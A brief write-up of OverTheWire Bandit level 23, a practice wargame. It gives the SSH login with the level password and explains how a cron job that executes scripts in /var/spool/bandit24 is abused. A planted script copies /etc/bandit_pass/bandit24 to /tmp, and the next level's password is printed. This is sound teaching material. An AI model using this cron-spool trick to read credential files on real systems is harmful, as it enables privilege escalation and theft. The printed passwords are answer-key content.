# Over The Wire -- Bandit 23

## Server
```
sshpass -p jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n ssh -p 2220 -oStrictHostKeyChecking=no bandit23@bandit.labs.overthewire.org 
```

## Solution
Again,
We look at cronjobs in `/etc/cron.d` as suggested.

We find `cronjob_bandit24`. it call the script `/usr/bin/cronjob_bandit24.sh`
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

```

So it execute every script i place in `/var/spool/bandit24`.
We place this script in there :
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24.password
```

And retrieve the password `cat /tmp/bandit24.password`:
```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
